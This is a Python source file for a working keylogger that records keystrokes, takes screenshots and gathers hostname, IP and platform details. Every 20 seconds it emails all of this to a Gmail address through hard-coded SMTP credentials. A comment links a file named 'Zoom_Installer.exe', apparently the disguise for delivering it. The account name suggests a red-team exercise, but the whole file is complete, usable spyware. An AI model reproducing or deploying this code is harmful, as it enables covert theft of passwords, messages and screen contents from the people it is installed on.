import threading
from pynput import keyboard
from pynput.mouse import Listener
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pathlib import Path
import smtplib
import pyautogui
import socket
import platform
from io import BytesIO
# import os
# https://www.mediafire.com/file/szv0frjp84xhvek/Zoom_Installer.exe/file

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.maxImgCnt = 5
        self.imgCnt = 0 
        self.imgs = [None] * self.maxImgCnt
        self.init = True

    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = "Mouse moved to {} {}\n".format(x, y)
        self.appendlog(current_move)
 
    def on_click(self, x, y, button, pressed):
        if pressed:
            # print("pressed")
            ScreenShotThread = threading.Thread(target = self.takeScreenShot)
            ScreenShotThread.start()
        # current_click = "{} at {}\n".format("Pressed" if pressed else "Released", (x, y))
        # self.appendlog(current_click) 
        # print("click")
        # self.takeScreenShot()
        # try:
        #     pid = os.fork()
        #     print('pid=',pid)
        #     if pid == 0:
        #         print("this is child process.")
        #         # source = source - 1 #在子程序中source減1
        #     else: #父程序
        #         print("this is parent process." )
        #         # print(source)
        # except OSError as e:
        #     pass

    def on_scroll(self, x, y, dx, dy):
        current_scroll = 'Scrolled {} at {}\n'.format('down' if dy < 0 else 'up', (x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            if hasattr(key, 'vk') and 96 <= key.vk <= 105:
                current_key = ' NUM' + str(key.vk - 96) + ' '
            else:
                current_key = str(key.char)

        except AttributeError:
            if key == key.enter:
                self.takeScreenShot()
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                if hasattr(key, 'vk') and 96 <= key.vk <= 105:
                    current_key = 'NUM' + str(key.vk - 96)
                else:
                    current_key = " " + str(key) + " "

        self.appendlog(current_key)
        self.appendlog("\n")

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("=== system information ===")
        self.appendlog("\nhostname: ")
        self.appendlog(hostname)
        self.appendlog("\nip: ")
        self.appendlog(ip)
        self.appendlog("\nprocessor: ")
        self.appendlog(plat)
        self.appendlog("\nsystem: ")
        self.appendlog(system)
        self.appendlog("\nmachine: ")
        self.appendlog(machine)
        self.appendlog("\n=====================\n")
       
    def report(self):
        # f = open('%f.txt'%time.time(), 'w')
        # f.write(self.log)
        # f.close()
        if(self.log != "KeyLogger Started...\n" and self.log != ""):           
            mail = MIMEMultipart() 
            mail["subject"] = "資料" 
            mail["from"] = "redteamg3@gmail.com"
            mail["to"] = "redteamg3@gmail.com"
            mail.attach(MIMEText(self.log))
            # mail.attach(MIMEImage(Path("2.png").read_bytes()))
            for img in self.imgs:
                if img:
                    mail.attach(MIMEImage(img))
            self.imgs = [None] * self.maxImgCnt
            self.imgCnt = 0
            acc="redteamg3@gmail.com"
            password="malware123"
     
            server=smtplib.SMTP_SSL("smtp.gmail.com",465)
            server.login(acc,password)
            server.send_message(mail)
            server.close()
            self.log = ""
        
        if self.init:
            self.init = False
            self.system_information()
        timer = threading.Timer(self.interval, self.report)
        timer.start()
 
    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        # mouse_listener = Listener(on_click=self.on_click) # , on_move=self.on_move, on_scroll=self.on_scroll
        keyboard_listener.start()
        # mouse_listener.start()
        self.report()

    def takeScreenShot(self):
        with BytesIO() as output:
            ss = pyautogui.screenshot()
            s = ss.resize((ss.size[0]//2, ss.size[1]//2))
            s.save(output, 'BMP')
            self.imgs[self.imgCnt % self.maxImgCnt] = output.getvalue()
            self.imgCnt += 1
            # print(self.imgCnt % self.maxImgCnt)

keylogger = KeyLogger(20)
keylogger.run()